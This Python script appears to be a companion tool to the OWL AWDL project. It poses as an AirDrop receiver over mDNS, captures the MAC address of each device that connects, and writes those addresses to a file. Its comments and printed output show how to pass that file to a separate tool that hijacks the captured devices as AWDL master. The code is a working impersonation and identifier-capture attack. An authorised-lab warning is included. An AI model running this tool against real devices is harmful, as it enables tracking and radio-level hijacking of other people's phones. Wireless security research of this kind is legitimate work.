#!/usr/bin/env python3
# OWL: an open Apple Wireless Direct Link (AWDL) implementation
# Copyright (C) 2018  The Open Wireless Link Project
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""AirDrop presence honeypot: advertise an AirDrop receiver and capture the
MAC of whoever connects, then hand it to ``awdl_master_inject.py``.

This is a research / testing companion for the OWL (Open Wireless Link)
project.  It poses as an AirDrop *receiver* on an already-up AWDL interface
(``awdl0``, provided by the ``owl`` daemon): it answers the mDNS browse for
``_airdrop._tcp`` that a sender performs when its share sheet is open, and
listens on the advertised port.  When a sender's device connects (which it
does during discovery, before any file is chosen), the honeypot reads the
peer's AWDL link-local IPv6 address, derives its MAC, writes it to a file and
prints it -- so it can be fed straight into the master-injection tool via its
``--targets-file`` option.

What it deliberately does NOT do: it never completes the AirDrop transfer and
never tries to recover the sender's identity (the BLE contact hashes or the
TLS validation record that can be brute-forced back to a phone number / email
are out of scope).  It only observes the link-layer address of a device that
chose to connect to the advertised service.

================================  AUTHORISED USE  ============================
Run this ONLY against devices you own or are explicitly authorised to test, in
an isolated RF lab.  Impersonating a service and capturing identifiers of
other people's devices without authorisation is unlawful in most places.  Like
the rest of OWL this is experimental research software -- use it at your own
risk.
=============================================================================

Setup (two radios: one for AWDL/owl, one for the monitor-mode injector):
    # radio A -- bring AWDL up so awdl0 exists with an IPv6 link-local addr:
    sudo owl -i wlan0 -c 6 &
    # pose as an AirDrop receiver on awdl0 and capture the first sender:
    sudo ./awdl_airdrop_honeypot.py -i awdl0 --once --out captured_target.txt
    # radio B -- hijack the captured device as AWDL master:
    sudo ./awdl_master_inject.py -i wlan1 --targets-file captured_target.txt \
         --channels 6,6,44,149 --channel-dwell 300ms --interval 110tu

Requirements: Linux, Python 3.6+, root, a running AWDL interface (``owl``).
No third-party modules needed.  Discoverability against real iOS may still
need tuning (BLE trigger, TLS certificate) -- verify in your lab.
"""

import argparse
import os
import random
import re
import socket
import ssl
import struct
import subprocess
import sys
import tempfile
import threading
import time

# ---------------------------------------------------------------------------
# constants
# ---------------------------------------------------------------------------

MDNS_ADDR6 = "ff02::fb"          # IPv6 link-local mDNS multicast group
MDNS_PORT = 5353
AIRDROP_SERVICE = "_airdrop._tcp.local"
DEFAULT_PORT = 8770              # port advertised in the SRV record (OpenDrop uses 8770/8771)
TTL = 120

# DNS record types / classes
T_A = 1
T_PTR = 12
T_TXT = 16
T_AAAA = 28
T_SRV = 33
C_IN = 1
CACHE_FLUSH = 0x8000             # top bit of the class field in mDNS responses


# ---------------------------------------------------------------------------
# DNS wire helpers (minimal, stdlib only)
# ---------------------------------------------------------------------------

def encode_name(name):
    """Encode a dotted DNS name into length-prefixed labels (no compression)."""
    out = bytearray()
    for label in name.split("."):
        if label == "":
            continue
        raw = label.encode("utf-8")
        if len(raw) > 63:
            raise ValueError("label too long: %r" % label)
        out.append(len(raw))
        out += raw
    out.append(0)
    return bytes(out)


def decode_name(buf, offset):
    """Decode a (possibly compressed) DNS name. Returns (name, next_offset)."""
    labels = []
    next_offset = None
    jumps = 0
    while True:
        if offset >= len(buf):
            raise ValueError("truncated name")
        length = buf[offset]
        if length & 0xC0 == 0xC0:               # compression pointer
            if offset + 2 > len(buf):
                raise ValueError("truncated pointer")
            pointer = ((length & 0x3F) << 8) | buf[offset + 1]
            if next_offset is None:
                next_offset = offset + 2
            offset = pointer
            jumps += 1
            if jumps > 64:
                raise ValueError("too many name pointers")
            continue
        if length == 0:
            offset += 1
            break
        offset += 1
        labels.append(buf[offset:offset + length].decode("utf-8", "replace"))
        offset += length
    if next_offset is None:
        next_offset = offset
    return ".".join(labels), next_offset


def parse_questions(buf):
    """Return the list of question names in a DNS query (best effort)."""
    if len(buf) < 12:
        return []
    qdcount = struct.unpack_from(">H", buf, 4)[0]
    offset = 12
    names = []
    for _ in range(qdcount):
        try:
            name, offset = decode_name(buf, offset)
            offset += 4                         # QTYPE + QCLASS
        except (ValueError, IndexError):
            break
        names.append(name.lower())
    return names


def _record(name, rtype, rclass, rdata, ttl=TTL):
    return encode_name(name) + struct.pack(">HHIH", rtype, rclass, ttl,
                                           len(rdata)) + rdata


def build_airdrop_response(instance, host, port, addr6, txt):
    """Build an mDNS response advertising one AirDrop service instance.

    ``instance`` is the full ``<id>._airdrop._tcp.local`` name, ``host`` the
    ``<id>.local`` target, ``addr6`` the 16-byte AWDL link-local address, and
    ``txt`` a list of TXT strings.
    """
    header = struct.pack(">HHHHHH", 0, 0x8400, 0, 1, 0, 3)   # QR+AA, 1 answer, 3 additional
    # Answer: the service PTR (shared record -> plain IN class)
    answer = _record(AIRDROP_SERVICE, T_PTR, C_IN, encode_name(instance))
    # Additionals: SRV, TXT, AAAA (unique records -> cache-flush bit set)
    srv = struct.pack(">HHH", 0, 0, port) + encode_name(host)
    add_srv = _record(instance, T_SRV, C_IN | CACHE_FLUSH, srv)
    txt_rdata = bytearray()
    for s in txt:
        raw = s.encode("utf-8")
        txt_rdata.append(len(raw) & 0xFF)
        txt_rdata += raw[:255]
    if not txt_rdata:
        txt_rdata = b"\x00"
    add_txt = _record(instance, T_TXT, C_IN | CACHE_FLUSH, bytes(txt_rdata))
    add_aaaa = _record(host, T_AAAA, C_IN | CACHE_FLUSH, addr6)
    return header + answer + add_srv + add_txt + add_aaaa


# ---------------------------------------------------------------------------
# interface helpers
# ---------------------------------------------------------------------------

def get_link_local(ifname):
    """Return the interface's IPv6 link-local address (fe80::...) or None."""
    try:
        out = subprocess.run(["ip", "-6", "addr", "show", "dev", ifname,
                              "scope", "link"], check=True,
                             stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
                             timeout=5).stdout.decode(errors="replace")
    except (FileNotFoundError, subprocess.SubprocessError):
        return None
    m = re.search(r"inet6\s+(fe80:[0-9a-f:]+)", out)
    return m.group(1) if m else None


def mac_from_ipv6(addr):
    """Recover a MAC from an EUI-64 IPv6 link-local address, or None.

    AWDL peers use RFC-4291 EUI-64 link-local addresses (see ``rfc4291_addr``
    in the OWL daemon), so the MAC is embedded: flip the U/L bit of the first
    interface-ID byte and drop the inserted ``ff:fe``.
    """
    addr = addr.split("%")[0]
    try:
        packed = socket.inet_pton(socket.AF_INET6, addr)
    except OSError:
        return None
    eui = packed[8:]
    if eui[3] != 0xFF or eui[4] != 0xFE:
        return None                             # not an EUI-64 address
    first = eui[0] ^ 0x02
    return bytes([first, eui[1], eui[2], eui[5], eui[6], eui[7]])


def mac_str(raw):
    return ":".join("%02x" % b for b in raw)


def neigh_mac(ifname, addr6):
    """Look up a peer's MAC in the neighbour table as a fallback."""
    try:
        out = subprocess.run(["ip", "-6", "neigh", "show", "dev", ifname],
                             check=True, stdout=subprocess.PIPE,
                             stderr=subprocess.DEVNULL, timeout=5
                             ).stdout.decode(errors="replace")
    except (FileNotFoundError, subprocess.SubprocessError):
        return None
    want = addr6.split("%")[0]
    for line in out.splitlines():
        parts = line.split()
        if parts and parts[0] == want and "lladdr" in parts:
            try:
                return bytes(int(x, 16) for x in parts[parts.index("lladdr") + 1].split(":"))
            except (ValueError, IndexError):
                return None
    return None


def peer_mac(ifname, addr6):
    """Best-effort MAC for a connected peer: EUI-64 first, neigh table fallback."""
    return mac_from_ipv6(addr6) or neigh_mac(ifname, addr6)


# ---------------------------------------------------------------------------
# mDNS responder
# ---------------------------------------------------------------------------

def open_mdns_socket(ifname, ifindex):
    """Open a UDP socket joined to the mDNS group on ``ifname``."""
    sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
    except (AttributeError, OSError):
        pass
    sock.bind(("", MDNS_PORT))
    mreq = socket.inet_pton(socket.AF_INET6, MDNS_ADDR6) + struct.pack("@I", ifindex)
    sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_JOIN_GROUP, mreq)
    sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_MULTICAST_IF,
                    struct.pack("@I", ifindex))
    sock.settimeout(0.5)
    return sock


def mdns_responder(sock, ifindex, instance, host, addr6_packed, port, txt, stop):
    """Answer AirDrop browse queries until ``stop`` is set."""
    response = build_airdrop_response(instance, host, port, addr6_packed, txt)
    mcast = (MDNS_ADDR6 + "%" + str(ifindex), MDNS_PORT, 0, ifindex)
    while not stop.is_set():
        try:
            data, src = sock.recvfrom(4096)
        except socket.timeout:
            continue
        except OSError:
            break
        names = parse_questions(data)
        if any(n == AIRDROP_SERVICE or n.endswith("." + AIRDROP_SERVICE) or n == host
               for n in names):
            try:
                sock.sendto(response, src)      # unicast reply to the querier
                sock.sendto(response, mcast)    # and multicast for good measure
            except OSError:
                pass


# ---------------------------------------------------------------------------
# TLS listener (connection = capture point)
# ---------------------------------------------------------------------------

def generate_self_signed_certfiles():
    """Write a throwaway self-signed cert+key to a temp dir and return their
    (cert_path, key_path), or (None, None) if the 'cryptography' module is not
    installed. AirDrop uses TLS with Apple-issued certs, but devices in
    'Everyone' mode accept a self-signed one for discovery, and either way the
    TCP/TLS connection already carries the peer address."""
    try:
        import datetime
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
    except ImportError:
        return None, None
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, u"airdrop")])
    now = datetime.datetime.utcnow()
    cert = (x509.CertificateBuilder()
            .subject_name(name).issuer_name(name)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now - datetime.timedelta(days=1))
            .not_valid_after(now + datetime.timedelta(days=365))
            .sign(key, hashes.SHA256()))
    tmp = tempfile.mkdtemp()
    cpath, kpath = os.path.join(tmp, "c.pem"), os.path.join(tmp, "k.pem")
    with open(cpath, "wb") as f:
        f.write(cert.public_bytes(serialization.Encoding.PEM))
    with open(kpath, "wb") as f:
        f.write(key.private_bytes(serialization.Encoding.PEM,
                                  serialization.PrivateFormat.TraditionalOpenSSL,
                                  serialization.NoEncryption()))
    return cpath, kpath


def make_self_signed_context():
    """A throwaway self-signed TLS *server* context, or None if no cert could
    be generated (the listener then falls back to plain TCP)."""
    cpath, kpath = generate_self_signed_certfiles()
    if cpath is None:
        return None
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(cpath, kpath)
    return ctx


def listener(ifname, addr6, port, ifindex, use_tls, on_peer, stop):
    """Accept connections on the advertised port; report each peer's MAC."""
    srv = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind((addr6, port, 0, ifindex))
    except OSError as exc:
        print("[!] cannot bind [%s%%%s]:%d (%s)" % (addr6, ifname, port, exc))
        stop.set()
        return
    srv.listen(8)
    srv.settimeout(0.5)
    ctx = make_self_signed_context() if use_tls else None
    if use_tls and ctx is None:
        print("[*] no 'cryptography' module; accepting plain TCP "
              "(still captures the MAC)")
    while not stop.is_set():
        try:
            conn, peer = srv.accept()
        except socket.timeout:
            continue
        except OSError:
            break
        paddr = peer[0]
        on_peer(paddr)
        # Best-effort TLS handshake so the sender gets a response; we never
        # complete the AirDrop exchange and read no payload identity.
        if ctx is not None:
            try:
                conn = ctx.wrap_socket(conn, server_side=True)
            except (ssl.SSLError, OSError):
                pass
        try:
            conn.close()
        except OSError:
            pass
    srv.close()


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------

def random_instance_id():
    return "".join(random.choice("0123456789abcdef") for _ in range(12))


def run_self_test():
    """Offline checks for the parts that don't need a radio."""
    # DNS name round-trip, including a compression pointer.
    enc = encode_name(AIRDROP_SERVICE)
    name, off = decode_name(enc, 0)
    assert name == AIRDROP_SERVICE and off == len(enc), (name, off)
    # A query we build parses back to the same question.
    q = struct.pack(">HHHHHH", 0x1234, 0, 1, 0, 0, 0) + \
        encode_name(AIRDROP_SERVICE) + struct.pack(">HH", T_PTR, C_IN)
    assert parse_questions(q) == [AIRDROP_SERVICE], parse_questions(q)
    # Response builds and its PTR answer decodes to our instance.
    inst = "a1b2c3d4e5f6." + AIRDROP_SERVICE
    host = "a1b2c3d4e5f6.local"
    addr = socket.inet_pton(socket.AF_INET6, "fe80::1")
    resp = build_airdrop_response(inst, host, DEFAULT_PORT, addr, ["flags=136"])
    assert struct.unpack_from(">H", resp, 6)[0] == 1        # ancount
    ptr_name, o = decode_name(resp, 12)
    assert ptr_name == AIRDROP_SERVICE
    o += 10                                                 # type+class+ttl+rdlen
    target, _ = decode_name(resp, o)
    assert target == inst, target
    # MAC <-> EUI-64 link-local round-trip.
    mac = bytes([0x00, 0xc0, 0xca, 0xbd, 0x09, 0x8a])
    eui = bytes([mac[0] ^ 0x02, mac[1], mac[2], 0xff, 0xfe, mac[3], mac[4], mac[5]])
    ll = socket.inet_ntop(socket.AF_INET6,
                          bytes([0xfe, 0x80, 0, 0, 0, 0, 0, 0]) + eui)
    got = mac_from_ipv6(ll)
    assert got == mac, (mac_str(got) if got else None, mac_str(mac))
    assert mac_from_ipv6("fe80::1") is None                 # not EUI-64
    print("self-test OK")
    return 0


def main(argv=None):
    parser = argparse.ArgumentParser(
        description="Pose as an AirDrop receiver on AWDL and capture the MAC of "
                    "the first device that connects (for authorised lab use).",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("-i", "--interface", default="awdl0",
                        help="AWDL interface the owl daemon created")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT,
                        help="TCP port advertised in the SRV record")
    parser.add_argument("--name", default=None,
                        help="AirDrop instance id (default: random 12 hex chars)")
    parser.add_argument("--out", default="captured_target.txt",
                        help="file to append captured MAC(s) to (fed to the "
                             "injector via --targets-file)")
    parser.add_argument("--once", action="store_true",
                        help="stop after the first captured MAC")
    parser.add_argument("--no-tls", action="store_true",
                        help="accept plain TCP instead of attempting TLS "
                             "(the MAC is captured either way)")
    parser.add_argument("--self-test", action="store_true",
                        help="run offline unit checks and exit (no radio needed)")
    args = parser.parse_args(argv)

    if args.self_test:
        return run_self_test()

    if os.geteuid() != 0:
        print("[!] note: binding mDNS/low ports usually needs root (sudo)")

    try:
        ifindex = socket.if_nametoindex(args.interface)
    except OSError:
        sys.exit("error: no such interface %r (is the owl daemon running?)"
                 % args.interface)
    addr6 = get_link_local(args.interface)
    if not addr6:
        sys.exit("error: %s has no IPv6 link-local address; start 'owl' first"
                 % args.interface)
    addr6_bare = addr6.split("%")[0]
    addr6_packed = socket.inet_pton(socket.AF_INET6, addr6_bare)

    instance_id = args.name or random_instance_id()
    instance = "%s.%s" % (instance_id, AIRDROP_SERVICE)
    host = "%s.local" % instance_id
    txt = ["flags=136"]                         # a plausible AirDrop TXT flag set

    stop = threading.Event()
    captured = []
    lock = threading.Lock()

    def on_peer(paddr):
        mac = peer_mac(args.interface, paddr)
        with lock:
            if mac is None:
                print("[*] connection from %s (could not derive MAC)" % paddr)
                return
            ms = mac_str(mac)
            if ms in captured:
                return
            captured.append(ms)
            first = len(captured) == 1
        print("[+] AirDrop sender connected: %s  ->  MAC %s%s"
              % (paddr, ms, "   <== FIRST" if first else ""))
        try:
            with open(args.out, "a") as fh:
                fh.write(ms + "\n")
        except OSError as exc:
            print("[!] could not write %s: %s" % (args.out, exc))
        if first:
            print("[*] feed it to the injector, e.g.:")
            print("      sudo ./awdl_master_inject.py -i <monitor-iface> "
                  "--targets-file %s \\" % args.out)
            print("           --channels 6,6,44,149 --channel-dwell 300ms "
                  "--interval 110tu")
        if args.once:
            stop.set()

    signal_installed = True
    try:
        import signal
        signal.signal(signal.SIGINT, lambda *_: stop.set())
    except (ImportError, ValueError):
        signal_installed = False

    sock = open_mdns_socket(args.interface, ifindex)
    resp_thread = threading.Thread(
        target=mdns_responder,
        args=(sock, ifindex, instance, host, addr6_packed, args.port, txt, stop),
        daemon=True)
    lst_thread = threading.Thread(
        target=listener,
        args=(args.interface, addr6_bare, args.port, ifindex,
              not args.no_tls, on_peer, stop),
        daemon=True)
    resp_thread.start()
    lst_thread.start()

    print("[*] AirDrop honeypot on %s ([%s]:%d)" % (args.interface, addr6_bare, args.port))
    print("    instance : %s" % instance)
    print("    capturing the first sender's MAC -> %s" % args.out)
    print("    (Ctrl-C to stop)" if signal_installed else "")

    try:
        while not stop.is_set():
            time.sleep(0.2)
    except KeyboardInterrupt:
        stop.set()
    sock.close()
    if captured:
        print("\n[*] captured %d MAC(s): %s" % (len(captured), ", ".join(captured)))
    else:
        print("\n[*] no sender connected")
    return 0


if __name__ == "__main__":
    sys.exit(main())
